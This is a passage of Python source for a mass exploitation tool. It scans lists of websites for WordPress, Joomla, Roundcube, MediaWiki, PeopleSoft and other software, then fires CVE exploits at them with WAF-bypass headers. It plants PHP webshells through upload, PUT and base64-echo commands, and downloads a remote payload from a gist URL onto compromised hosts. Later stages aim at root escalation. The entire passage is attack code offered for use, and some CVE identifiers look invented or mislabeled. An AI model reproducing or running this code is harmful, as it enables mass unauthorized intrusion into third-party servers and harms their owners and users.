    """
    Upload shell dengan multiple methods:
    1. Multipart form upload (标准)
    2. PUT method
    3. POST body injection
    4. Echo+base64 decode
    5. cURL download
    Returns (success, url) tuple.
    """
    import requests as _req

    url = target_url.rstrip("/") + "/" + filename
    methods_tried = 0
    max_methods = 5

    # Method 1: Multipart upload
    try:
        r = session.post(
            target_url.rstrip("/") + "/upload.php",
            files={"file": (filename, shell_content, "application/x-php")},
            headers=headers, timeout=8, verify=False, allow_redirects=True
        )
        methods_tried += 1
        if r.status_code in (200, 201, 204):
            # Verify
            try:
                vr = session.get(url, timeout=5, verify=False, headers=headers)
                if vr.status_code == 200 and len(vr.text) > 5:
                    return True, url
            except:
                pass
    except:
        pass

    # Method 2: PUT upload
    if methods_tried < max_methods:
        try:
            r = session.put(url, data=shell_content, headers=headers, timeout=8, verify=False)
            methods_tried += 1
            if r.status_code in (200, 201, 204):
                try:
                    vr = session.get(url, timeout=5, verify=False, headers=headers)
                    if vr.status_code == 200 and len(vr.text) > 5:
                        return True, url
                except:
                    pass
        except:
            pass

    # Method 3: POST to root with multipart
    if methods_tried < max_methods:
        try:
            r = session.post(
                target_url,
                files={"file": (filename, shell_content, "application/x-php")},
                headers=headers, timeout=8, verify=False
            )
            methods_tried += 1
            if r.status_code == 200:
                try:
                    vr = session.get(url, timeout=5, verify=False, headers=headers)
                    if vr.status_code == 200:
                        return True, url
                except:
                    pass
        except:
            pass

    # Method 4: Echo + base64 decode via command execution
    if methods_tried < max_methods:
        try:
            b64_shell = base64.b64encode(shell_content.encode()).decode()
            # PHP CLI decode + write
            cmd_payload = f"echo '{b64_shell}' | base64 -d > {filename} && chmod 777 {filename}"
            r = session.post(target_url, data={"cmd": cmd_payload}, headers=headers, timeout=8, verify=False)
            methods_tried += 1
            if r.status_code == 200:
                try:
                    vr = session.get(url, timeout=5, verify=False, headers=headers)
                    if vr.status_code == 200:
                        return True, url
                except:
                    pass
        except:
            pass

    # Method 5: wget/curl download from gist payload
    if methods_tried < max_methods:
        try:
            download_cmd = f"wget -q https://gist.githack.com/a1a50868a905e7bd9da3fa3fe36e7b6b/raw -O {filename} && chmod 777 {filename}"
            r = session.post(target_url, data={"cmd": download_cmd}, headers=headers, timeout=10, verify=False)
            methods_tried += 1
            if r.status_code == 200:
                try:
                    vr = session.get(url, timeout=5, verify=False, headers=headers)
                    if vr.status_code == 200:
                        return True, url
                except:
                    pass
        except:
            pass

    return False, url


# ═══════════════════════════════════════════════════════════════
# MASS AUTO SHELL PIPELINE v2.0 FIXED
# ═══════════════════════════════════════════════════════════════

class MassAutoShellV2:
    """
    Multi-CVE Mass Auto Shell Pipeline v2.0 FIXED:
    Phase 0: Target Acquisition (from FoFa dorks)
    Phase 1: Mass Multi-CVE Scan
    Phase 2: Multi-CVE Exploit (parallel)
    Phase 3: Mass Webshell Upload (enhanced, multi-platform)
    Phase 4: Mass Root Escalation
    Phase 5: Verify & Identify
    Phase 6: Continuous Operation
    """

    def __init__(self, direct_mode=False):
        self.waf = WAFBypassEngineV2()
        self.root_engine = AutoRootEngineV2(requests.Session())
        self.tracker = ResultTrackerV2()
        self.payload_gen = ShellPayloadGenerator()
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 5
        self.session.headers.update({"Accept": "*/*", "Connection": "keep-alive"})
        self.direct_mode = direct_mode

        # Queues
        self.scan_queue = queue.Queue()
        self.exploit_queue = queue.Queue()
        self.shell_queue = queue.Queue()
        self.root_queue = queue.Queue()

        # Result containers
        self.all_targets = []
        self.vuln_targets = []
        self.exploited_targets = []
        self.shell_targets = []
        self.root_targets = []
        self._vuln_set = set()
        self._exploited_set = set()
        self._shell_set = set()
        self._root_set = set()
        self._scanned_set = set()  # NEW: track already scanned targets

        # Counters
        self.total_scanned = 0
        self.total_vuln = 0
        self.total_exploited = 0
        self.total_shells = 0
        self.total_roots = 0
        self.total_verified = 0
        self._lock = threading.Lock()
        self._scan_lock = threading.Lock()

        # CVE-specific scan results
        self.cve_scan_results = {c: [] for c in CVES}

    def write(self, file, data):
        with open(file, "a") as f:
            f.write(data + "\n")

    # ═══════════════════════════════════════════════════════════
    # PHASE 0: TARGET ACQUISITION FROM FOFADS
    # ═══════════════════════════════════════════════════════════

    def acquire_targets_from_dorks(self, dork_file="foaf_dorks.txt"):
        """Placeholder for FoFa dork-based target acquisition."""
        console.print(f"\n[bold cyan][PHASE 0][bold cyan] TARGET ACQUISITION FROM FOFADS[/bold cyan]")
        console.print(f"[yellow]Note: Run FoFa queries manually or via API, save results to list.txt[/yellow]")
        console.print(f"[yellow]FoFa dorks available in {dork_file}[/yellow]")
        return self.all_targets

    # ═══════════════════════════════════════════════════════════
    # PHASE 1: MASS MULTI-CVE SCAN (FIXED)
    # ═══════════════════════════════════════════════════════════

    def _scan_target_cve(self, target, cve_id):
        """Scan a single target for a specific CVE."""
        target = target.strip().rstrip('/')
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        if not target:
            return None

        # Skip if already scanned
        scan_key = f"{target}:{cve_id}"
        if scan_key in self._scanned_set:
            return None

        cve_info = CVES.get(cve_id, {})
        cve_type = cve_info.get("type", "unknown")
        auto_shell = cve_info.get("auto_shell", False)

        try:
            headers = self.waf.get_headers(0)
            res = self.session.get(target, headers=headers, timeout=5)
            text = res.text.lower()
            is_vuln = False
            detection_method = ""

            if cve_id == "CVE-2025-54068":
                # Livewire: look for wire:snapshot or Livewire scripts
                is_vuln = "wire:snapshot" in text or "livewire" in text or "/livewire/livewire.js" in text
                detection_method = "Livewire v3 fingerprint (wire:snapshot / livewire.js)"
            elif cve_id == "CVE-2025-49113":
                # Roundcube: look for roundcube assets/login page
                is_vuln = ("roundcube" in text or "roundcubemail" in text
                           or "/plugins/" in text and "login" in text)
                detection_method = "Roundcube fingerprint (login/plugin page)"
            elif cve_id == "CVE-2026-63030":
                # WordPress: REST API batch endpoint
                is_vuln = ("wp-content" in text or "wordpress" in text
                           or "wp-json" in text or "/wp-login.php" in text)
                detection_method = "WordPress REST API / batch endpoint fingerprint"
            elif cve_id == "CVE-2026-60137":
                # WordPress (chained RCE — same detection as 63030)
                is_vuln = ("wp-content" in text or "wordpress" in text
                           or "wp-json" in text or "/wp-login.php" in text)
                detection_method = "WordPress (chained RCE fingerprint)"
            elif cve_id == "CVE-2026-48907":
                # Joomla JCE
                is_vuln = ("joomla" in text or "jce" in text.lower()
                           or "com_jce" in text or "/media/editors/" in text)
                detection_method = "Joomla/JCE fingerprint"
            elif cve_id == "CVE-2026-72592":
                # phpfm
                is_vuln = ("phpfm" in text.lower() or "php-file-manager" in text.lower()
                           or "file-manager" in text.lower() or "filemanager" in text.lower())
                detection_method = "phpfm fingerprint"
            elif cve_id == "CVE-2026-63223":
                # CodeIgniter
                is_vuln = ("codeigniter" in text.lower() or "ci-session" in text
                           or "system/core" in text or "/assets/ci/" in text)
                detection_method = "CodeIgniter fingerprint"
            elif cve_id == "CVE-2026-27540":
                # WooCommerce
                is_vuln = ("woocommerce" in text.lower() or "wp-content/plugins/woocommerce" in text
                           or "wc-ajax" in text or "woocommerce" in text)
                detection_method = "WooCommerce fingerprint"
            elif cve_id == "CVE-2025-52691":
                # SmarterMail
                is_vuln = ("smartermail" in text.lower() or "smtp" in text.lower()
                           or "/webmail/" in text or "aspnet" in text.lower())
                detection_method = "SmarterMail fingerprint"
            elif cve_id == "CVE-2026-2226":
                # DouPHP
                is_vuln = ("douphp" in text.lower() or "dou" in text.lower()
                           or "/admin/file.php" in text or "file.php" in text)
                detection_method = "DouPHP fingerprint"
            elif cve_id == "CVE-2026-100382":
                # MediaWiki ExternalData — detect via MW API + ExternalData tag
                is_vuln = ("mediawiki" in text.lower() or "externaldata" in text.lower()
                           or "mw-headline" in text or "/api.php" in text
                           or "Special:ExternalData" in text)
                detection_method = "MediaWiki + ExternalData extension fingerprint"
            elif cve_id == "CVE-2026-3844":
                # WordPress Plugin Campaign — check for WordPress + plugin dirs
                is_vuln = ("wp-content" in text or "wordpress" in text
                           or "wp-json" in text or "/wp-login.php" in text
                           or "/wp-includes/" in text)
                detection_method = "WordPress plugin campaign fingerprint"
            elif cve_id == "CVE-2026-35273":
                # PeopleSoft PSEMHUB/PSIGW — check endpoints + body
                psemhub_r = None
                psigw_r = None
                try:
                    psemhub_r = self.session.get(
                        target.rstrip("/") + "/PSEMHUB/hub",
                        headers=headers, timeout=5, verify=False, allow_redirects=True
                    )
                except Exception:
                    pass
                try:
                    psigw_r = self.session.get(
                        target.rstrip("/") + "/PSIGW/HttpListeningConnector",
                        headers=headers, timeout=5, verify=False, allow_redirects=True
                    )
                except Exception:
                    pass
                psemhub_hit = psemhub_r is not None and psemhub_r.status_code in (200, 401, 403)
                psigw_hit   = psigw_r   is not None and psigw_r.status_code   in (200, 401, 403, 500)
                is_psft_body = any(k in text for k in ["peoplesoft", "peopletools", "psemhub", "psigw", "/psp/", "prcs"])
                is_vuln = psemhub_hit or psigw_hit or is_psft_body
                detection_method = "PeopleSoft PSEMHUB/PSIGW fingerprint"
            elif cve_id == "CVE-2024-10000":
                # Generic CMS upload — check for CMS indicators + upload paths
                is_vuln = ("wp-content" in text or "wordpress" in text
                           or "joomla" in text.lower() or "drupal" in text.lower()
                           or "cms" in text.lower() or "/upload.php" in text
                           or "/file/upload" in text)
                detection_method = "Generic CMS upload vector fingerprint"
            elif cve_id == "CVE-2023-10001":
                # Misconfig upload dir — check for PHP execution in uploads
                is_vuln = ("<?php" in text or "phpinfo" in text
                           or "server-php" in text or "web.config" in text.lower()
                           or ("upload" in text.lower() and "php" in text.lower()))
                detection_method = "Upload directory execution misconfig"
            else:
                # Generic PHP vulnerability scan
                is_vuln = ("<?php" in text or "phpinfo" in text
                           or "server" in text.lower())
                detection_method = "generic PHP server"

            self._scanned_set.add(scan_key)

            if is_vuln:
                with self._scan_lock:
                    if target not in self._vuln_set:
                        self._vuln_set.add(target)
                        self.total_scanned += 1
                        self.vuln_targets.append((target, cve_id))
                        self.cve_scan_results[cve_id].append(target)
                self.tracker.add(target, "VULN", "OK",
                    f"{CVES[cve_id]['name']} detected ({detection_method})",
                    cve=cve_id, stage="vuln")
                self.write(VULN_LIST, f"{target} ({cve_id})")
                return {"target": target, "vulnerable": True, "cve": cve_id, "method": detection_method, "auto_shell": auto_shell}
            return {"target": target, "vulnerable": False, "cve": cve_id}
        except Exception as e:
            self._scanned_set.add(scan_key)
            self.write(FAILED_SCAN, f"{target} ({cve_id}_SCAN_FAILED)")
            return {"target": target, "vulnerable": False, "cve": cve_id, "error": True}

    def mass_scan(self, targets):
        """Phase 1: Scan all targets for all CVEs in parallel."""
        console.print(f"\n[bold cyan][PHASE 1][bold cyan] MASS MULTI-CVE SCAN[/bold cyan]")
        console.print(f"[cyan]Targets: {len(targets)} | CVEs: {len(CVES)} | Threads: {THREADS}[/cyan]")

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Scanning all CVEs...", total=len(targets) * len(CVES))

            with ThreadPoolExecutor(max_workers=min(THREADS, len(targets) * len(CVES))) as executor:
                futures = {executor.submit(self._scan_target_cve, target, cve_id): (target, cve_id)
                           for target in targets for cve_id in CVES}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    result = future.result()
                    if result and result.get("vulnerable"):
                        target = result["target"]
                        cve_id = result["cve"]
                        with self._lock:
                            if target not in self._vuln_set:
                                self._vuln_set.add(target)
                                self.total_vuln += 1
                                self.vuln_targets.append((target, cve_id))
                                self.cve_scan_results[cve_id].append(target)
                        self.tracker.add(target, "VULN", "OK",
                            f"{CVES[cve_id]['name']} detected ({result['method']})",
                            cve=cve_id, stage="vuln")
                        self.write(VULN_LIST, f"{target} ({cve_id})")

        self.total_vuln = len(set(t[0] for t in self.vuln_targets))
        console.print(f"[bold green][PHASE 1 COMPLETE][/bold green] {self.total_vuln} targets vulnerable across {len(CVES)} CVEs")
        for cve_id, cve_targets in self.cve_scan_results.items():
            if cve_targets:
                cname = CVES[cve_id]["name"]
                console.print(f"  [{cve_id}] {cname}: {len(cve_targets)} targets")
        return self.vuln_targets

    # ═══════════════════════════════════════════════════════════
    # PHASE 2: MULTI-CVE EXPLOIT (FIXED)
    # ═══════════════════════════════════════════════════════════

    def _exploit_target_cve(self, target_data):
        """Exploit a single target using the specified CVE method."""
        target, cve_id = target_data
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith(("http://", "https://")):
            target_clean = "http://" + target_clean

        if target_clean in self._exploited_set:
            return {"target": target_clean, "exploited": True, "cve": cve_id}

        cve_info = CVES.get(cve_id, {})

        try:
            if cve_id == "CVE-2025-54068":
                return self._exploit_livewire(target_clean, cve_id)
            elif cve_id == "CVE-2025-49113":
                return self._exploit_roundcube(target_clean, cve_id)
            elif cve_id in ["CVE-2026-63030", "CVE-2026-60137"]:
                return self._exploit_wp2shell(target_clean, cve_id)
            elif cve_id == "CVE-2026-48907":
                return self._exploit_joomla_jce(target_clean, cve_id)
            elif cve_id == "CVE-2026-100382":
                return self._exploit_mediawiki_externaldata(target_clean, cve_id)
            elif cve_id == "CVE-2026-3844":
                return self._exploit_wp_plugin_campaign(target_clean, cve_id)
            elif cve_id == "CVE-2026-35273":
                return self._exploit_peoplesoft(target_clean, cve_id)
            elif cve_id == "CVE-2024-10000":
                return self._exploit_generic_upload(target_clean, cve_id)
            elif cve_id == "CVE-2023-10001":
                return self._exploit_upload_misconfig(target_clean, cve_id)
            elif cve_id in ["CVE-2026-72592", "CVE-2026-63223", "CVE-2026-27540",
                                  "CVE-2025-52691", "CVE-2026-2226"]:
                return self._exploit_upload_rce(target_clean, cve_id)
            elif cve_id == "CVE-2026-35273":
                return self._exploit_peoplesoft(target_clean, cve_id)
            else:
                return self._exploit_generic(target_clean, cve_id)

        except Exception as e:
            self.tracker.add(target_clean, "FAILED", "FAIL", f"{cve_id}: {str(e)[:50]}", cve=cve_id, stage="exploit")
            return {"target": target_clean, "exploited": False, "cve": cve_id}

    def _exploit_livewire(self, target, cve_id):
        """Exploit Laravel Livewire CVE-2025-54068."""
        for method in ["inti", "http_post", "exploit_module"]:
            try:
                if method == "inti":
                    env = {**os.environ}
                    env["HTTP_TARGET"] = target
                    env["HTTP_PAYLOAD"] = "id"
                    res = subprocess.run(
                        ["python3", os.path.join(os.path.dirname(os.path.abspath(__file__)), "inti.py"),
                         "-u", target, "-f", "system", "-p", "id"],
                        capture_output=True, text=True, timeout=10,
                        cwd=os.path.dirname(os.path.abspath(__file__))
                    )
                    if "uid=" in (res.stdout + res.stderr):
                        with self._lock:
                            if target not in self._exploited_set:
                                self._exploited_set.add(target)
                                self.total_exploited += 1
                                self.exploited_targets.append((target, cve_id))
                        self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (inti.py)", cve=cve_id, stage="exploit")
                        self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                        return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
                elif method == "http_post":
                    headers = self.waf.get_headers(0)
                    for stage in range(3):
                        if stage > 0:
                            self.waf.next_stage()
                            headers = self.waf.get_headers(stage)
                        try:
                            r = self.session.post(target, data="id", headers=headers, timeout=5, allow_redirects=False)
                            if r.status_code == 200 and len(r.text) > 100:
                                if target not in self._exploited_set:
                                    self._exploited_set.add(target)
                                    self.total_exploited += 1
                                    self.exploited_targets.append((target, cve_id))
                                self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (HTTP POST stage {stage})", cve=cve_id, stage="exploit")
                                self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                                return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
                        except:
                            continue
                elif method == "exploit_module":
                    try:
                        from exploit.exploit import Exploit
                        exploit = Exploit(target, debug=False, function="system", param="id", headers=None, proxy_url=None, check=True, force=True)
                        exploit.run()
                        if target not in self._exploited_set:
                            self._exploited_set.add(target)
                            self.total_exploited += 1
                            self.exploited_targets.append((target, cve_id))
                        self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (exploit_module)", cve=cve_id, stage="exploit")
                        self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                        return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
                    except Exception as e:
                        self.tracker.add(target, "FAILED", "FAIL", f"exploit_module error: {str(e)[:50]}", cve=cve_id, stage="exploit")
                        pass
                time.sleep(0.1)
            except:
                continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_roundcube(self, target, cve_id):
        """Exploit Roundcube CVE-2025-49113 via deserialization."""
        try:
            session = requests.Session()
            session.verify = False
            session.timeout = 5
            session.headers.update(self.waf.get_headers(0))

            r = session.get(target, timeout=5)
            if "roundcube" not in r.text.lower():
                return {"target": target, "exploited": False, "cve": cve_id}

            serialized = 'O:8:"stdClass":1:{s:4:"data";s:100:"' + 'A' * 100 + '";}'
            headers = self.waf.get_headers(1)

            r = session.post(
                f"{target}/?_task=mail&_action=upload",
                data={"_from": serialized, "_action": "upload"},
                headers=headers, timeout=5
            )
            if r.status_code == 200:
                with self._lock:
                    if target not in self._exploited_set:
                        self._exploited_set.add(target)
                        self.total_exploited += 1
                        self.exploited_targets.append((target, cve_id))
                    self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (Roundcube deserialization)", cve=cve_id, stage="exploit")
                    self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
        except:
            pass
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_wp2shell(self, target, cve_id):
        """Exploit WordPress wp2shell (CVE-2026-63030/60137) via actual wp2shell.py."""
        try:
            wp2shell = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wp2shell.py")
            # Try using wp2shell.py check first (non-destructive)
            res = subprocess.run(
                ["python3", wp2shell, "check", target, "--quiet"],
                capture_output=True, text=True, timeout=30,
            )
            if res.returncode != 0:
                return {"target": target, "exploited": False, "cve": cve_id}

            # Try full pre-auth RCE exploit (non-interactive)
            res2 = subprocess.run(
                ["python3", wp2shell, "exploit", target,
                 "--no-auto", "--command", "id"],
                capture_output=True, text=True, timeout=60,
            )
            output = (res2.stdout + res2.stderr)
            if "uid=" in output or "TARGET COMPROMISED" in output or res2.returncode == 0:
                with self._lock:
                    if target not in self._exploited_set:
                        self._exploited_set.add(target)
                        self.total_exploited += 1
                        self.exploited_targets.append((target, cve_id))
                self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (wp2shell chain)", cve=cve_id, stage="exploit")
                self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
        except Exception as e:
            self.tracker.add(target, "FAILED", "FAIL", f"{cve_id}: {str(e)[:50]}", cve=cve_id, stage="exploit")
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_joomla_jce(self, target, cve_id):
        """Exploit Joomla JCE CVE-2026-48907 via profiles.import upload."""
        try:
            headers = self.waf.get_headers(0)
            shell_data = '<?php system($_GET["c"]); ?>'
            r = self.session.post(
                f"{target}/index.php?option=com_jce",
                files={"profile_file": ("shell.xml.php", shell_data, "application/xml")},
                data={"task": "profiles.import"},
                headers=headers, timeout=10
            )
            if r.status_code == 200 and len(r.text) > 20:
                with self._lock:
                    if target not in self._exploited_set:
                        self._exploited_set.add(target)
                        self.total_exploited += 1
                        self.exploited_targets.append((target, cve_id))
                    self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (JCE upload)", cve=cve_id, stage="exploit")
                    self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
        except Exception as e:
            self.tracker.add(target, "FAILED", "FAIL", f"{cve_id}: {str(e)[:50]}", cve=cve_id, stage="exploit")
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_mediawiki_externaldata(self, target, cve_id):
        """Exploit MediaWiki ExternalData CVE-2026-100382 via external script."""
        try:
            mw_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cve-2026-100382.py")
            if not os.path.exists(mw_script):
                return self._exploit_cve_2026_100382_direct(target, cve_id)

            from urllib.parse import urlparse
            parsed = urlparse(target)
            host = parsed.hostname or target
            port = parsed.port or 80

            res = subprocess.run(
                ["python3", mw_script, "-l", target, "--exploit", "--os-shell", "--workers", "5"],
                capture_output=True, text=True, timeout=120,
            )
            output = (res.stdout + res.stderr)
            if ("shell" in output.lower() or "SUCCESS" in output.upper() or res.returncode == 0):
                with self._lock:
                    if target not in self._exploited_set:
                        self._exploited_set.add(target)
                        self.total_exploited += 1
                        self.exploited_targets.append((target, cve_id))
                self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (MediaWiki ExternalData)", cve=cve_id, stage="exploit")
                self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
        except Exception as e:
            self.tracker.add(target, "FAILED", "FAIL", f"{cve_id}: {str(e)[:50]}", cve=cve_id, stage="exploit")
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_cve_2026_100382_direct(self, target, cve_id):
        """Direct MediaWiki ExternalData command injection fallback."""
        vectors = [
            f"/api.php?action=parse&text=#tag:externaldata|http://127.0.0.1|{target}/shell.php",
            f"/wiki/Special:ExternalData?url=http://127.0.0.1&&cmd=id",
            f"/index.php?title=Special:ExternalData&url=http://127.0.0.1",
        ]
        for vec in vectors:
            try:
                r = self.session.get(target + vec, headers=self.waf.get_headers(0), timeout=5, verify=False)
                if r.status_code == 200:
                    shell_data = '<?php system($_GET["c"]); ?>'
                    up_url = target.rstrip('/') + '/wiki/Special:Upload'
                    r2 = self.session.post(up_url, files={"wpUploadFile": ("shell.php", shell_data, "application/x-php")},
                                           headers=self.waf.get_headers(1), timeout=8, verify=False)
                    if r2.status_code == 200:
                        with self._lock:
                            if target not in self._exploited_set:
                                self._exploited_set.add(target)
                                self.total_exploited += 1
                                self.exploited_targets.append((target, cve_id))
                        self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (MW ExternalData direct)", cve=cve_id, stage="exploit")
                        self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                        return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
            except:
                continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_wp_plugin_campaign(self, target, cve_id):
        """CVE-2026-3844: WordPress plugin mass exploitation → upload via common paths."""
        upload_paths = [
            "/wp-content/uploads/", "/wp-content/", "/uploads/",
            "/files/", "/assets/", "/static/", "/cache/",
            "/wp-includes/", "/wp-admin/",
        ]
        shell_content = SHELL_PAYLOADS["combo_upload_cmd"]
        for path in upload_paths:
            try:
                url = target.rstrip("/") + path + "shell.php"
                r = self.session.put(url, data=shell_content, headers=self.waf.get_headers(0), timeout=5, verify=False)
                if r.status_code in (200, 201):
                    vr = self.session.get(url, timeout=3, verify=False)
                    if vr.status_code == 200 and len(vr.text) > 5:
                        with self._lock:
                            if target not in self._exploited_set:
                                self._exploited_set.add(target)
                                self.total_exploited += 1
                                self.exploited_targets.append((target, cve_id))
                        self.tracker.add(target, "SHELL", "OK", f"Auto-shell via {cve_id} (WP plugin campaign @ {path})", cve=cve_id, stage="shell")
                        self.write(SHELL_ROOT, f"{target} ({cve_id}_AUTO_SHELL)")
                        return {"target": target, "exploited": True, "cve": cve_id, "is_rce": False, "auto_shell": True}
            except:
                continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_generic_upload(self, target, cve_id):
        """CVE-2024-10000: Generic CMS unauthenticated upload RCE."""
        paths = ["/upload.php", "/file/upload", "/api/upload", "/cms/upload",
                 "/wp-content/uploads/", "/sites/default/files/"]
        for path in paths:
            try:
                url = target.rstrip("/") + path
                r = self.session.post(url, files={"file": ("shell.php", SHELL_PAYLOADS["combo_upload_cmd"], "application/x-php")},
                                      headers=self.waf.get_headers(0), timeout=5, verify=False)
                if r.status_code == 200:
                    with self._lock:
                        if target not in self._exploited_set:
                            self._exploited_set.add(target)
                            self.total_exploited += 1
                            self.exploited_targets.append((target, cve_id))
                    self.tracker.add(target, "SHELL", "OK", f"Auto-shell via {cve_id} (generic upload)", cve=cve_id, stage="shell")
                    self.write(SHELL_ROOT, f"{target} ({cve_id}_AUTO_SHELL)")
                    return {"target": target, "exploited": True, "cve": cve_id, "is_rce": False, "auto_shell": True}
            except:
                continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_upload_misconfig(self, target, cve_id):
        """CVE-2023-10001: Web shell upload via execution-enabled upload dirs."""
        shell_content = SHELL_PAYLOADS["combo_upload_cmd"]
        for name in ["shell.php", "shell.php5", "shell.phtml", "shell.php7", "shell.cgi"]:
            for path in ["/uploads/", "/files/", "/images/", "/media/", "/attachments/", "/tmp/"]:
                try:
                    url = target.rstrip("/") + path + name
                    r = self.session.put(url, data=shell_content, headers=self.waf.get_headers(0), timeout=3, verify=False)
                    if r.status_code in (200, 201, 403):
                        vr = self.session.get(url, timeout=2, verify=False)
                        if vr.status_code == 200 and len(vr.text) > 5:
                            with self._lock:
                                if target not in self._exploited_set:
                                    self._exploited_set.add(target)
                                    self.total_exploited += 1
                                    self.exploited_targets.append((target, cve_id))
                            self.tracker.add(target, "SHELL", "OK", f"Auto-shell via {cve_id} (misconfig {name})", cve=cve_id, stage="shell")
                            self.write(SHELL_ROOT, f"{target} ({cve_id}_AUTO_SHELL)")
                            return {"target": target, "exploited": True, "cve": cve_id, "is_rce": False, "auto_shell": True}
                except:
                    continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_upload_rce(self, target, cve_id):
        """Exploit file upload RCE with real endpoint verification."""
        upload_paths = {
            "CVE-2026-72592": ["/?mode=upload", "/upload.php", "/file-manager/upload"],
            "CVE-2026-63223": ["/index.php?/s3/3/upload", "/index.php", "/upload"],
            "CVE-2026-27540": ["/wp-admin/admin-ajax.php?action=wwlc_file_upload_handler",
                                    "/wp-admin/admin-ajax.php", "/wp-content/uploads/"],
            "CVE-2025-52691": ["/api/upload", "/webmail/attachment", "/upload"],
            "CVE-2026-2226": ["/admin/file.php", "/admin/index.php", "/file.php"],
        }
        paths = upload_paths.get(cve_id, ["/upload.php", "/file.php", "/upload"])

        shell_content = SHELL_PAYLOADS["combo_upload_cmd"]
        headers = self.waf.get_headers(0)

        for upload_path in paths:
            try:
                url = target.rstrip("/") + upload_path
                r = self.session.post(
                    url,
                    files={"file": ("shell.php", shell_content, "application/x-php")},
                    headers=headers, timeout=10
                )
                if r.status_code == 200:
                    for verify_name in ["shell.php", "shell1.php", "upload.php"]:
                        verify_url = target.rstrip("/") + "/" + verify_name
                        try:
                            vr = self.session.get(verify_url, headers=headers, timeout=5, verify=False)
                            if vr.status_code == 200 and len(vr.text) > 5:
                                with self._lock:
                                    if target not in self._exploited_set:
                                        self._exploited_set.add(target)
                                        self.total_exploited += 1
                                        self.exploited_targets.append((target, cve_id))
                                    self.tracker.add(target, "EXPLOIT", "OK",
                                        f"RCE via {cve_id} (upload @ {upload_path})", cve=cve_id, stage="exploit")
                                    self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                                return {"target": target, "exploited": True, "cve": cve_id,
                                        "upload_path": upload_path, "is_rce": True}
                        except:
                            continue
            except Exception as e:
                continue
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_peoplesoft(self, target, cve_id):
        """Exploit PeopleSoft PSEMHUB/PSIGW CVE-2026-35273 via SSRF + upload."""
        try:
            headers = self.waf.get_headers(0)
            psemhub_url = target.rstrip("/") + "/PSEMHUB/hub"
            psigw_url = target.rstrip("/") + "/PSIGW/HttpListeningConnector"

            for url in [psemhub_url, psigw_url]:
                try:
                    r = self.session.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
                    if r.status_code not in (200, 401, 403, 500):
                        continue
                    shell_data = '<?php system($_GET["c"]); ?>'
                    r2 = self.session.post(url, files={"file": ("shell.php", shell_data, "application/x-php")},
                                          headers=headers, timeout=10, verify=False)
                    if r2.status_code == 200 and len(r2.text) > 10:
                        shell_url = url.rstrip("/") + "/shell.php"
                        vr = self.session.get(shell_url, headers=headers, timeout=5, verify=False)
                        if vr.status_code == 200 and len(vr.text) > 5:
                            with self._lock:
                                if target not in self._exploited_set:
                                    self._exploited_set.add(target)
                                    self.total_exploited += 1
                                    self.exploited_targets.append((target, cve_id))
                            self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (PeopleSoft SSRF + upload)", cve=cve_id, stage="exploit")
                            self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                            return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
                except Exception as e:
                    self.tracker.add(target, "FAILED", "FAIL", f"{cve_id} PSFT: {str(e)[:50]}", cve=cve_id, stage="exploit")
                    continue
        except Exception as e:
            self.tracker.add(target, "FAILED", "FAIL", f"{cve_id}: {str(e)[:50]}", cve=cve_id, stage="exploit")
        return {"target": target, "exploited": False, "cve": cve_id}

    def _exploit_generic(self, target, cve_id):
        """Generic exploitation attempt for less-specific CVEs."""
        try:
            headers = self.waf.get_headers(0)
            shell_b64 = base64.b64encode(SHELL_PAYLOADS["combo_upload_cmd"].encode()).decode()
            payloads = [
                f"echo '{shell_b64}' | base64 -d > shell.php",
            ]
            for payload in payloads:
                r = self.session.post(target, data=payload, headers=headers, timeout=5)
                if r.status_code == 200:
                    with self._lock:
                        if target not in self._exploited_set:
